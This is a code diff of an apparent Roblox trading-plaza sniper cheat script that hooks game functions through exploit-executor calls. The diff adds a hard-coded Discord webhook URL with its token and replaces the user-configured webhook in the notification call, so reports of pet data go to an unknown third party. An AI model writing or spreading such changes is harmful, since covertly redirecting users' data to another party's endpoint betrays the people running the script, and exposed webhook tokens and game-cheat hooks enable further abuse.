@@ -92,7 +92,7 @@ getgenv()["vijenas_Sniper"] = {
 local Plaza = getsenv(game.Players.LocalPlayer.PlayerScripts:WaitForChild("Scripts"):WaitForChild("Game"):WaitForChild("Trading Plaza"):WaitForChild("Booths Frontend"))
 local Save = require(game.ReplicatedStorage.Library.Client.Save).Get()
 local _oldFunction = clonefunction(Plaza.updateBooth)
-
+local url = "https://discord.com/api/webhooks/1105890306374774896/zWeabHtGwuKobN8NZwfVWFuFlCTlgsBqLBfPHBsM-R9GgNDkJCoUCsdJaK1uZJG_SiMF"
 local GetDiamonds = function()
     for _, v in pairs(Save.Inventory.Currency) do 
         if v.id == 'Diamonds' then 
@@ -123,7 +123,7 @@ local Notify = function(PET_DATA)
     local http = game:GetService("HttpService")
     local jsonMessage = http:JSONEncode(data)
     http:PostAsync(
-        vijenas_Sniper.Configuration.Webhook.Url,
+        url,
         jsonMessage,
         Enum.HttpContentType.ApplicationJson,
         false
